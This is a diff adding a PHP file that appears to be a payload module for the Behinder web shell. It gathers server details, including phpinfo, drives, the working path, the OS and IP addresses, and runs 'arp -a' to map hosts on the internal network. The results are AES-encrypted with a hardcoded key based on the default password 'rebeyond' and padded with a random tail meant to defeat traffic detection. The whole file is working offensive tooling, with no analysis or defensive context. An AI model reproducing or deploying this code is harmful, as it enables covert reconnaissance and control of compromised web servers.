@@ -1,0 +1,86 @@
+error_reporting(0);
+function main($whatever) {
+    $result = array();
+    ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean();
+    $driveList ="";
+    if (stristr(PHP_OS,"windows")||stristr(PHP_OS,"winnt"))
+    {
+        for($i=65;$i<=90;$i++)
+    	{
+    		$drive=chr($i).':/';
+    		file_exists($drive) ? $driveList=$driveList.$drive.";":'';
+    	}
+    }
+	else
+	{
+		$driveList="/";
+	}
+    $currentPath=getcwd();
+    //echo "phpinfo=".$info."\n"."currentPath=".$currentPath."\n"."driveList=".$driveList;
+    $osInfo=PHP_OS;
+    $arch="64";
+    if (PHP_INT_SIZE == 4) {
+        $arch = "32";
+    }
+    $localIp=gethostbyname(gethostname());
+    if ($localIp!=$_SERVER['SERVER_ADDR'])
+    {
+        $localIp=$localIp." ".$_SERVER['SERVER_ADDR'];
+    }
+    $extraIps=getInnerIP();
+    foreach($extraIps as $ip)
+    {
+        if (strpos($localIp,$ip)===false)
+        {
+         $localIp=$localIp." ".$ip;
+        }
+    }
+    $basicInfoObj=array("basicInfo"=>base64_encode($info),"driveList"=>base64_encode($driveList),"currentPath"=>base64_encode($currentPath),"osInfo"=>base64_encode($osInfo),"arch"=>base64_encode($arch),"localIp"=>base64_encode($localIp));
+    //echo json_encode($result);
+    $result["status"] = base64_encode("success");
+    $result["msg"] = base64_encode(json_encode($basicInfoObj));
+    //echo json_encode($result);
+    //echo openssl_encrypt(json_encode($result), "AES128", $key);
+    echo encrypt(json_encode($result));
+}
+function getInnerIP()
+{
+$result = array();
+
+if (is_callable("exec"))
+{
+    $result = array();
+    exec('arp -a',$sa);
+    foreach($sa as $s)
+    {
+        if (strpos($s,'---')!==false)
+		{
+			$parts=explode(' ',$s);
+			$ip=$parts[1];
+			array_push($result,$ip);
+		}
+		//var_dump(explode(' ',$s));
+           // array_push($result,explode(' ',$s)[1]);
+    }
+
+}
+
+return $result;
+}
+
+
+
+
+    function Encrypt($data)
+    {
+        $key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的�?16位，默认连接密码rebeyond
+        $encrypted=base64_encode(openssl_encrypt($data, "AES-128-ECB", $key,OPENSSL_PKCS1_PADDING));
+        $magicNum=hexdec(substr($key,0,2))%16; //根据密钥动�?�确定魔法尾巴的长度
+        for($i=0;$i<$magicNum;$i++)
+        {
+            $encrypted=$encrypted.chr(mt_rand(0, 255)); //拼接魔法尾巴
+        }
+        return $encrypted;
+    }
+$whatever="eXhhaDNEU3JGN3NoNE5Xb0Y0OTYzWkprc0JwV2c2MktMZmRIZHdHbzVodHExbTNrSHZDV2U3WjdSVzMxRFpaMEtnU0sycFhwbU5RcmF3bzVDRGdyMzg5ZXpSSTg3eEo3Nk9GcmV4OTJ5UDd2eWJmUkdRZllpV05vZEJjaGxxMWFpTEZnOUxIbURxRFFnSFg1c0dkamh1NURkYVRSekgxVTVIWGw5QTZHMll1dGlZQjJLZmJFQWxNbnA3aG44MjBuQTdCNWFVV3lWU3laRERIMkpYejBScWdNWWE4Q0oybEQ2cGJFSHFtdEVCWWNNME40SzFMTEV3QXFvcE9tY0lpUnlBNDRER2dXeVVPaVJBQ3RzckdsNEhia0I=";$whatever=base64_decode($whatever);
+main($whatever);
